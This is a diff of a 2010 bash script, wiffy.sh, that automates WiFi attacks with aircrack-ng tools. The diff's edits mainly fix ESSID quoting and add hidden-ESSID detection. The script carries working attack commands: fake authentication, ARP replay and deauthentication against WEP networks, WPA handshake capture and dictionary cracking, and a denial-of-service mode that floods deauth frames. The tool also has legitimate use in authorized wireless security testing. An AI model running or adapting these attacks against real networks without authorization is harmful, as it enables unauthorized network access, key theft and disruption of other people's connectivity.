@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#wiffy.sh v0.1 (#4 2010-09-11)                                                                 #
+#wiffy.sh v0.1 (#5 2010-09-13)                                                                 #
 # (C)opyright 2010 - g0tmi1k                                                                   #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -37,7 +37,7 @@ diagnostics="false"
 verbose="0"
 
 #---Variables----------------------------------------------------------------------------------#
-         version="0.1 (#4)"   # Version
+         version="0.1 (#5)"   # Version
 monitorInterface="mon0"       # Default
            bssid=""           # null the value
            essid=""           # null the value
@@ -50,27 +50,33 @@ trap 'cleanup interrupt' 2    # Captures interrupt signal (Ctrl + C)
 #----Functions---------------------------------------------------------------------------------#
 function findAP () { #findAP
    action "Scanning network" "rm -f /tmp/wiffy.tmp && iwlist $interface scan > /tmp/wiffy.tmp" $verbose $diagnostics "true"
-   arrayESSID=( $(cat /tmp/wiffy.tmp | tr '"' ' ' | awk -F":" '/ESSID/{print $2}' ) )
-   arrayBSSID=( $(cat /tmp/wiffy.tmp | grep "Address:" | awk '{print $5}\' ) )
-   arrayChannel=( $(cat /tmp/wiffy.tmp | grep "Channel:" | tr ':' ' ' | awk '{print $2}\' ) )
-   arrayProtected=( $(cat /tmp/wiffy.tmp | grep "key:" | sed 's/.*key://g' ) )
+   #arrayESSID=( $(cat /tmp/wiffy.tmp | awk -F":" '/ESSID/{print $2}') )
+   arrayBSSID=( $(cat /tmp/wiffy.tmp | grep "Address:" | awk '{print $5}\') )
+   arrayChannel=( $(cat /tmp/wiffy.tmp | grep "Channel:" | tr ':' ' ' | awk '{print $2}\') )
+   arrayProtected=( $(cat /tmp/wiffy.tmp | grep "key:" | sed 's/.*key://g') )
    arrayQuality=( $(cat /tmp/wiffy.tmp | grep "Quality" | sed 's/.*Quality=//g' | awk -F " " '{print $1}' ) )
 
    id=""
    index="0"
    for item in "${arrayBSSID[@]}"; do
-      if [ "$bssid" == "$item" ] ; then id=$index ;fi
+      if [ "$bssid" ] && [ "$bssid" == "$item" ] ; then id="$index" ;fi
       command=$(cat /tmp/wiffy.tmp | sed -n "/$item/, +20p" | grep "WPA" )
       if [ "$command" ] ; then arrayEncryption[$index]="WPA"
       elif [ ${arrayProtected[$index]} == "off" ] ; then arrayEncryption[$index]="N/A"
       else arrayEncryption[$index]="WEP" ; fi
       index=$(($index+1))
    done
+
+   #-Cheap hack to support essids with spaces in-----------------------------------------------------------
+   cat /tmp/wiffy.tmp | awk -F":" '/ESSID/{print $2}' | sed 's/\"//' | sed 's/\(.*\)\"/\1/' > /tmp/wiffy.ssid
    index="0"
-   for item in "${arrayESSID[@]}"; do
-      if [ "$essid" == "$item" ] ; then id=$index ;  fi
+   while read line ; do
+      if [ "$essid" ] && [ "$essid" == "$line" ] ; then id="$index" ;  fi
+      arrayESSID[$index]="$line"
       index=$(($index+1))
-   done
+   done < "/tmp/wiffy.ssid"
+   rm -f /tmp/wiffy.ssid
+   #--------------------------------------------------------------------------------------------------------------
 }
 function findClient () { #findClient $encryption
    if [ -z "$1" ] ; then error="1" ; fi # Coding error
@@ -79,20 +85,28 @@ function findClient () { #findClient $encryption
       action "Removing temp files" "rm -f /tmp/wiffy.dump* && sleep 1" $verbose $diagnostics "true"
       action "airodump-ng (client(s))" "airodump-ng --bssid $bssid --channel $channel --write /tmp/wiffy.dump --output-format netxml $monitorInterface" $verbose $diagnostics "true" &
       sleep 3
+
       if [ "$1" == "WEP" ] || [ "$1" == "N/A" ] ; then # N/A = For MAC filtering
          sleep 5
-         client=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1) #> /tmp/wiffy.dump
+         client=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
       elif [ "$1" == "WPA" ] ; then
          while [ -z "$client" ] ; do
             sleep 2
-            client=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1) #> /tmp/wiffy.dump
+            client=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
          done
       fi
+
+      if [ -z "$essid" ] ; then
+         essid=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "<essid cloaked=\"false\">" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
+         if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "*hidden* essid=$essid" $diagnostics ; fi
+      fi
+
       command=$(ps aux | grep "airodump-ng" | awk '!/grep/ && !/awk/ && !/cap/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
       if [ -n "$command" ] ; then
          action "Killing programs" "kill $command" $verbose $diagnostics "true"
          sleep 1
       fi
+
       action "Removing temp files" "rm -f /tmp/wiffy.dump*" $verbose $diagnostics "true"
       if [ "$client" == "" ] ; then client="clientless" ; fi
       if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "client=$client" $diagnostics ; fi
@@ -114,9 +128,9 @@ function update() { # update
          display info "You're using the latest version. (=" $diagnostics
       fi
    else
-         display info "Updating..." $diagnostics
-         wget -nv -N http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh
-         display info "Updated! (=" $diagnostics
+      display info "Updating..." $diagnostics
+      wget -nv -N http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh
+      display info "Updated! (=" $diagnostics
    fi
    echo
    exit 2
@@ -205,9 +219,9 @@ function help() {
     -Doesn't detect any/my wireless network
        > Don't run from a virtual machine
        > Driver issue - Use a different WiFi device
-       > Re-run the script
-       > You're too close/far away
+       > Try the 're[f]resh' option
        > Unplug WiFi device, wait, replug
+       > You're too close/far away
 
     -\"Extras\" doesn't work
        > Network doesn't have a DHCP server
@@ -275,7 +289,7 @@ function display() { # display type message $diagnostics
 echo -e "\e[01;36m[*]\e[00m wiffy v$version"
 
 #----------------------------------------------------------------------------------------------#
-while getopts "i:t:m:e:b:c:w:z:s:xdvV?" OPTIONS; do
+while getopts "i:t:m:e:b:c:w:z:s:xdvVu?" OPTIONS; do
    case ${OPTIONS} in
       i ) interface=$OPTARG;;
       t ) monitorInterface=$OPTARG;;
@@ -375,7 +389,7 @@ action "Killing 'Programs'" "killall wicd-client airodump-ng xterm" $verbose $di
 action "Killing 'wicd service'" "/etc/init.d/wicd stop" $verbose $diagnostics "true" # Stopping wicd to prevent channel hopping
 
 #----------------------------------------------------------------------------------------------#
-action "Refreshing interface" "ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" $verbose $diagnostics "true"
+action "Refreshing interface" "ifconfig $interface down && ifconfig $interface up && sleep 1" $verbose $diagnostics "true"
 loopMain="false"
 while [ "$loopMain" != "true" ] ; do
    findAP
@@ -387,13 +401,14 @@ while [ "$loopMain" != "true" ] ; do
       loop=${#arrayBSSID[@]}
       echo -e " Num |         ESSID          |       BSSID       | Protected | Cha | Quality\n-----|------------------------|-------------------|-----------|-----|---------"
       for (( i=0;i<$loop;i++)); do
-         printf "  %-2s | %-22s | %-16s | %3s (%-3s) |  %-3s|  %-6s\n" $(($i+1)) ${arrayESSID[${i}]} ${arrayBSSID[${i}]} ${arrayProtected[${i}]} ${arrayEncryption[${i}]} ${arrayChannel[${i}]} ${arrayQuality[${i}]}
+         printf '  %-2s | %-22s | %-16s | %3s (%-3s) |  %-3s|  %-6s\n' "$(($i+1))" "${arrayESSID[${i}]}" "${arrayBSSID[${i}]}" "${arrayProtected[${i}]}" "${arrayEncryption[${i}]}" "${arrayChannel[${i}]}" "${arrayQuality[${i}]}"
       done
       loopSub="false"
       while [ "$loopSub" != "true" ] ; do
-         read -p "[~] [r]escan, e[x]it or select num: "
+         read -p "[~] re[s]can, re[f]resh, e[x]it or select num: "
          if [ "$REPLY" == "x" ] ; then cleanup clean
-         elif [ "$REPLY" == "r" ] ; then loopSub="true" # aka do nothing
+         elif [ "$REPLY" == "s" ] ; then loopSub="true" # aka do nothing
+         elif [ "$REPLY" == "f" ] ; then action "Refreshing interface" "ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" $verbose $diagnostics "true" && loopSub="true" # aka do nothing
          elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input, $REPLY" $diagnostics 1>&2
          elif [ "$REPLY" -lt 1 ] || [ "$REPLY" -gt $loop ] ; then display error "Incorrect number, $REPLY" $diagnostics 1>&2
          else id="$(($REPLY-1))" ; loopSub="true" ; loopMain="true"
@@ -562,18 +577,18 @@ if [ "$mode" == "crack" ] ; then
    if [ "$encryption" == "WEP" ] ; then
       if [ "$client" == "clientless" ] ; then
          display action "Attack (FakeAuth): $fakeMac" $diagnostics
-         action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e $essid -a $bssid -h $mac $monitorInterface" $verbose $diagnostics "true"
-         #action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 30 -o 1 -q 10 -e $essid -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true"
+         action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $mac $monitorInterface" $verbose $diagnostics "true"
+         #action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 30 -o 1 -q 10 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true"
          #if [Association successful] = then
          client=$mac
          sleep 1
       fi
       display action "Attack (ARPReplay+Deauth): $client" $diagnostics
-      action "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e $essid -b $bssid -h $client $monitorInterface" $verbose $diagnostics "true" "0|195|10" & # Don't wait, do the next command
+      action "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e \"$essid\" -b $bssid -h $client $monitorInterface" $verbose $diagnostics "true" "0|195|10" & # Don't wait, do the next command
       sleep 1
-      action "aireplay-ng (deauth)" "aireplay-ng --deauth 5 -e $essid -a $bssid -c $fakeMac $monitorInterface" $verbose $diagnostics "true"
+      action "aireplay-ng (deauth)" "aireplay-ng --deauth 5 -e \"$essid\" -a $bssid -c $fakeMac $monitorInterface" $verbose $diagnostics "true"
       sleep 1
-      if [ "$client" == "$mac" ] ; then sleep 20 && action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e $essid -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true" ; fi
+      if [ "$client" == "$mac" ] ; then sleep 20 && action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true" ; fi
       sleep 60
 
    #----------------------------------------------------------------------------------------------#
@@ -582,7 +597,7 @@ if [ "$mode" == "crack" ] ; then
       loop="0" # 0 = first, 1 = client, 2 = everyone
       echo "g0tmi1k" > /tmp/wiffy.tmp
       for (( ; ; )) ; do
-         action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -w /tmp/wiffy.tmp -e $essid > /tmp/wiffy.handshake" $verbose $diagnostics "true"
+         action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -w /tmp/wiffy.tmp -e \"$essid\" > /tmp/wiffy.handshake" $verbose $diagnostics "true"
          command=$(cat /tmp/wiffy.handshake | grep "Passphrase not in dictionary" ) #Got no data packets from client network & No valid WPA handshakes found
          if [ "$command" ] ; then break; fi
          sleep 2
@@ -606,8 +621,8 @@ if [ "$mode" == "crack" ] ; then
    #----------------------------------------------------------------------------------------------#
    if [ "$encryption" == "WEP" ] || [ "$encryption" == "WPA" ] ; then
       display action "Starting: aircrack-ng" $diagnostics
-      if [ "$encryption" == "WEP" ] ; then action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -e $essid -l /tmp/wiffy.key" $verbose $diagnostics "false" "0|350|30" ; fi
-      if [ "$encryption" == "WPA" ] ; then action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -w $wordlist -e $essid -l /tmp/wiffy.key" $verbose $diagnostics "false" "0|0|20" ; fi
+      if [ "$encryption" == "WEP" ] ; then action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -e \"$essid\" -l /tmp/wiffy.key" $verbose $diagnostics "false" "0|350|30" ; fi
+      if [ "$encryption" == "WPA" ] ; then action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -w $wordlist -e \"$essid\" -l /tmp/wiffy.key" $verbose $diagnostics "false" "0|0|20" ; fi
    fi
 
    #----------------------------------------------------------------------------------------------#
@@ -654,7 +669,7 @@ if [ "$mode" == "crack" ] ; then
 #----------------------------------------------------------------------------------------------#
 elif [ "$mode" == "dos" ] ; then
    display action "Attack (DOS): $essid" $diagnostics
-   command="aireplay-ng --deauth 0 -e $essid -a $bssid"
+   command="aireplay-ng --deauth 0 -e \"$essid\" -a $bssid"
    if [ "$client" != "clientless" ] ; then  command="$command -c $client" ; fi
    command="$command $monitorInterface"
    action "aireplay-ng (DeAuth)" "$command" $verbose $diagnostics "true" &
@@ -695,10 +710,8 @@ cleanup clean
 # WPA - calculate hash
 # WPA - use pre hash / use pre capture
 # WPA - use folder for wordlist
-# update aircrack/coWPATTY
-# decrty packets (offline & online (airtun-ng))
-# display error "The encryption ($encryption) on $essid isn't support" $diagnostics 1>&2 ; cleanup
-# Hidden SSID?
-# Mode - Injection - GET WORKING
-
 # WiFi Key is in hex
+# update - aircrack/coWPATTY
+# decrypt packets - offline & online (airtun-ng)
+# Mode - Injection - GET WORKING
+# display error "The encryption ($encryption) on $essid isn't support" $diagnostics 1>&2 ; cleanup
